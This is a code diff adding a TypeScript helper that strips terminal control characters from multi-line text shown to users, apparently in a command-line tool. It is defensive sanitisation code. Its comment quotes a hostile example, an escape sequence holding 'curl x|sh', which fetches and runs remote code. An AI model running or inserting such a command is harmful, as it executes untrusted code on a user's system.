@@ -35,6 +35,20 @@ export function stripControlChars(s: string): string {
 }
 
 /**
+ * {@link stripControlChars} for text shown over several lines (a reply, a diff, a
+ * multi-line command): newlines and tabs stay, so it keeps its shape, and every
+ * other control character goes, a carriage return included (one could rewrite the
+ * line it follows). Only the control characters are removed, never the printable
+ * rest of an escape sequence: "ESC[2K" leaves "[2K" on screen. That is deliberate
+ * where the text is something the user approves, because removing a whole OSC
+ * ("ESC]0;curl x|sh;BEL") would hide the very words the shell runs.
+ */
+export function stripControlCharsKeepLines(s: string): string {
+  // eslint-disable-next-line no-control-regex -- removing control characters is the point
+  return s.replace(/[\x00-\x08\x0b-\x1f\x7f-\x9f]/g, '')
+}
+
+/**
  * The OSC 52 sequence that asks the terminal to put `text` on the system
  * clipboard. Only for text WE chose to copy (e.g. `/share`'s fixed invite); this
  * is exactly the escape `stripControlChars` keeps out of untrusted output.
